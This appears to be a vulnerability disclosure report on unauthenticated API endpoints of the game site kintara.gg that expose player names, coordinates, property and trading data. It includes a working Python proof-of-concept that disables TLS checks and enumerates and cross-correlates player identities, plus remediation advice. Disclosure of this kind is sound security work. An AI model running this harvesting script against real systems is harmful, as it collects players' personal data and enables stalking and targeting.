# Unauthenticated Player Data Exposure Across 10+ API Endpoints in kintara.gg

**ID:** vuln-0005
**Severity:** HIGH
**Found:** 2026-07-12 23:00:41 UTC
**Target:** https://kintara.gg
**Endpoint:** /api/spectate/chat/bootstrap, /api/property-signs/status, /api/mansion/{id}/status, /api/house/{id}/status, /api/trailer/{id}/status, /api/flat/{id}/status, /api/marketplace/listings, /api/token/blimp-stats, /api/site/stats, /api/version
**Method:** GET
**CWE:** CWE-200
**CVSS:** 7.5

## Description

Multiple unauthenticated API endpoints on https://kintara.gg expose sensitive player data without requiring any authentication, session token, or wallet signature. By combining data from these endpoints, an attacker can build a comprehensive database of 230+ unique player identities, their in-game coordinates, property ownership, marketplace trading activity, and real-world financial data (USD-priced trades). The endpoints were confirmed to be accessible with no cookies, no Authorization header, and no wallet signature — just a standard browser User-Agent.

Confirmed unauthenticated endpoints:
1. GET /api/spectate/chat/bootstrap — Returns 20 chat messages per shard with playerId, displayName, walletPubkey field (currently empty but present in schema), worldX/worldZ coordinates, message text, and timestamp. Supports ?shardId=1-10 parameter to enumerate all shards, yielding 69 unique player IDs across 10 shards.
2. GET /api/property-signs/status — Returns ALL property owners across mansions (3), houses (5), trailers (8), and flats (18) with ownerName, ownerId, and locked status. 24 unique property owners exposed.
3. GET /api/mansion/{id}/status — Individual mansion status with ownerName, ownerId, locked status. IDs 1-3 return data; IDs 4+ return 404 (proper boundary enforcement).
4. GET /api/house/{id}/status — Same for houses, IDs 1-5 return data.
5. GET /api/trailer/{id}/status — Same for trailers, IDs 1-8 return data.
6. GET /api/flat/{id}/status — Same for flats, IDs 1-18 return data.
7. GET /api/marketplace/listings — Returns 20 listings by default, but accepts ?limit=100&offset=N to enumerate all listings. Each listing exposes sellerId, sellerName, itemType, quantity, priceGold, priceUsd, currency, itemDurability, and createdAt timestamp. 300 listings and 150 unique sellers were enumerated.
8. GET /api/marketplace/stats?itemType=X&currency=Y — Returns 30-day sales data including daily average unit prices and sales volumes.
9. GET /api/token/blimp-stats — Returns $KINS token mint address (Tqj8yFmagrg7oorpQkVGYR52r96RFTamvWfth9bpump), price, market cap, and holders count.
10. GET /api/site/stats — Returns {"onlineNow":1404,"monthlyActive":30455} user activity metrics.
11. GET /api/world/merchant-campaign — Returns campaign resources, goals, cycle info.
12. GET /api/world/expansion-tribute — Returns tribute status and goals.
13. GET /api/servers — Returns 31 server entries with population labels, capacity, and membership requirement flags.
14. GET /api/version — Returns Git commit SHA (49ef62cc53d001badfe71cec670dc172d2bd5142) for the deployed application.

Cross-correlation of player IDs across chat (69), marketplace (150), and property owners (24) yielded 230 unique player profiles with associated usernames, in-game coordinates, property holdings, and trading activity — all without authentication.

## Impact

An attacker can enumerate the entire active player base of kintara.gg without any authentication:

1. **Player Tracking & Stalking**: Real-time world coordinates (worldX, worldZ) from the chat endpoint allow tracking any player's physical location in the game world. An attacker can monitor all 10 shards to find where specific players are at any time.

2. **Identity Correlation**: By correlating playerId across chat, marketplace, and property endpoints, an attacker builds a full identity map — playerId ↔ displayName ↔ in-game position ↔ properties owned ↔ marketplace activity. This enables targeted attacks against specific high-value players.

3. **Financial Intelligence**: Marketplace listings expose sellerId, sellerName, itemType, quantity, priceGold, priceUsd, and currency. An attacker can track every player's trading activity, including real-world USD values of their trades, enabling market manipulation and targeting of wealthy players.

4. **Property Reconnaissance**: All 34 property owners (mansions, houses, trailers, flats) are exposed with their ownerName and ownerId, enabling targeted attacks against property owners.

5. **Token Intelligence**: The $KINS token mint address, price, market cap, and holder count are exposed, enabling correlation with on-chain Solana data to de-anonymize wallet addresses.

6. **Infrastructure Fingerprinting**: The /api/version endpoint leaks the Git commit SHA (49ef62cc53d001badfe71cec670dc172d2bd5142), enabling attackers to identify exact code versions and potentially correlate with source code for vulnerability discovery.

7. **Privacy Violation**: The walletPubkey field in chat messages (currently empty but present in the API schema) indicates the infrastructure is designed to potentially expose Solana wallet public keys — if this field gets populated, it would link game identities to blockchain wallets, enabling de-anonymization and targeted attacks.

## Technical Analysis

The kintara.gg API exposes multiple endpoints that serve player and game data without any authentication check. The application uses Cloudflare as a CDN but does not enforce authentication at the API layer for these endpoints. Authenticated endpoints (like /api/guilds/list, /api/arena/leaderboard, /api/auth/player-stats) properly return 401 with {"ok":false,"error":"unauthorized"}, proving that authentication enforcement exists but was not applied to the spectate/property/marketplace endpoints.

Key technical observations:
- All requests were made with only a standard browser User-Agent header — no cookies, no Authorization header, no wallet signature, no session token.
- The /api/spectate/chat/bootstrap endpoint accepts a ?shardId=N parameter (tested 1-10, all return 200) to enumerate chat across all game shards. Each response includes a walletPubkey field in every message object, currently empty string, but the field exists in the schema indicating the capability to expose wallet addresses.
- The /api/marketplace/listings endpoint defaults to 20 results but accepts ?limit=100&offset=N for full pagination, allowing enumeration of all active marketplace listings. The limit parameter caps at 100 (limit=1000 still returns 100), but offset pagination works, enabling full enumeration.
- The /api/property-signs/status endpoint returns a single aggregated response containing ALL property types and their owners — no need to iterate individual property IDs.
- Individual property endpoints (/api/{type}/{id}/status) also work independently for all property types (mansion, house, trailer, flat), with proper 404 responses for non-existent IDs.
- The /api/version endpoint returns a Git commit SHA, providing exact deployment version information.
- No rate limiting was observed during testing (rapid sequential requests across 10+ endpoints, 100+ IDs).

## Proof of Concept

1. Send unauthenticated GET request to /api/spectate/chat/bootstrap — receives 200 with chat messages containing playerId, displayName, worldX, worldZ, message text
2. Repeat with ?shardId=2 through ?shardId=10 — each returns 200 with different player data from each shard (69 unique players total)
3. Send GET /api/property-signs/status — receives 200 with all 34 property owners across mansions/houses/trailers/flats with ownerName and ownerId
4. Send GET /api/marketplace/listings?limit=100&offset=0 — receives 200 with 100 marketplace listings including sellerId, sellerName, priceUsd
5. Send GET /api/marketplace/listings?limit=100&offset=100 — receives next 100 listings (200 total)
6. Send GET /api/marketplace/listings?limit=100&offset=200 — receives next 100 listings (300 total)
7. Send GET /api/token/blimp-stats — receives 200 with $KINS token mint address and market data
8. Send GET /api/version — receives 200 with Git commit SHA
9. Cross-correlate all playerId/sellerId/ownerId values to build unified player database (230 unique players)

```
#!/usr/bin/env python3
"""PoC: Unauthenticated player data enumeration on kintara.gg"""
import json, urllib.request, ssl

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
opener = urllib.request.build_opener(
    urllib.request.ProxyHandler({}),
    urllib.request.HTTPSHandler(context=ctx)
)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"

def fetch(url):
    req = urllib.request.Request(url, headers={"User-Agent": UA, "Accept": "application/json"})
    return json.loads(opener.open(req, timeout=10).read())

# 1. Enumerate chat players from all shards
chat_players = {}
for shard in range(1, 11):
    data = fetch(f"https://kintara.gg/api/spectate/chat/bootstrap?shardId={shard}")
    for msg in data.get("messages", []):
        pid = msg["playerId"]
        if pid not in chat_players:
            chat_players[pid] = {
                "name": msg["displayName"],
                "coords": (msg["worldX"], msg["worldZ"]),
                "walletPubkey": msg.get("walletPubkey", ""),
            }
print(f"[+] Chat players enumerated: {len(chat_players)} unique IDs across 10 shards")

# 2. Enumerate property owners
props = fetch("https://kintara.gg/api/property-signs/status")
owners = set()
for ptype in ["mansions", "houses", "trailers", "flats"]:
    for pid, info in props.get(ptype, {}).items():
        if info.get("ok"):
            owners.add(info["ownerId"])
print(f"[+] Property owners enumerated: {len(owners)} unique ownerIDs")

# 3. Enumerate marketplace sellers (full pagination)
sellers = set()
offset = 0
while offset < 1000:
    data = fetch(f"https://kintara.gg/api/marketplace/listings?limit=100&offset={offset}")
    listings = data.get("listings", [])
    if not listings:
        break
    for l in listings:
        sellers.add(l["sellerId"])
    offset += 100
print(f"[+] Marketplace sellers enumerated: {len(sellers)} unique sellerIDs")

# 4. Token stats
token = fetch("https://kintara.gg/api/token/blimp-stats")
print(f"[+] Token mint exposed: {token['mint']} (price: ${token['priceUsd']:.8f}, MC: ${token['marketCapUsd']:,})")

# 5. Version (Git SHA)
version = fetch("https://kintara.gg/api/version")
print(f"[+] Git commit SHA exposed: {version['sha']}")

# 6. Cross-correlation
all_ids = set(chat_players.keys()) | owners | sellers
print(f"\n[*] TOTAL UNIQUE PLAYER IDs CORRELATED (no auth): {len(all_ids)}")
print(f"[*] Chat ∩ Marketplace: {len(set(chat_players.keys()) & sellers)}")
print(f"[*] Chat ∩ Properties: {len(set(chat_players.keys()) & owners)}")
print(f"[*] Marketplace ∩ Properties: {len(sellers & owners)}")
```

## Remediation

1. **Add authentication to all player-data endpoints**: Require a valid session token or wallet signature for /api/spectate/chat/bootstrap, /api/property-signs/status, /api/{type}/{id}/status, and /api/marketplace/listings. Only the player's own data should be accessible; other players' data should require explicit authorization.

2. **Remove sensitive fields from public responses**: The chat endpoint should not expose playerId, worldX, worldZ coordinates to unauthenticated users. The walletPubkey field should be removed from the response schema entirely unless explicitly needed for an authenticated, authorized context.

3. **Rate-limit all API endpoints**: No rate limiting was observed. Add per-IP and per-token rate limits to prevent automated enumeration (e.g., max 10 requests per minute per IP for unauthenticated endpoints).

4. **Implement data minimization**: The marketplace endpoint should not expose sellerId and sellerName to unauthenticated users. Consider returning only anonymized listing data (item, price, quantity) without seller identity.

5. **Remove /api/version endpoint or require authentication**: The Git commit SHA provides version fingerprinting that helps attackers identify specific code versions. Remove this endpoint or restrict it to authenticated admin users.

6. **Restrict /api/token/blimp-stats**: Token mint address and market data may be public by design, but the endpoint should still be rate-limited and monitored for abuse.

7. **Add pagination limits to marketplace**: While limit=100 is capped, offset pagination with no total cap allows full enumeration. Consider requiring authentication for offset > 0 or capping the total accessible results for unauthenticated users.

8. **Audit all API endpoints for authentication coverage**: Endpoints like /api/guilds/list and /api/arena/leaderboard properly return 401, proving auth infrastructure exists — apply the same middleware to the spectate, property, and marketplace endpoints.
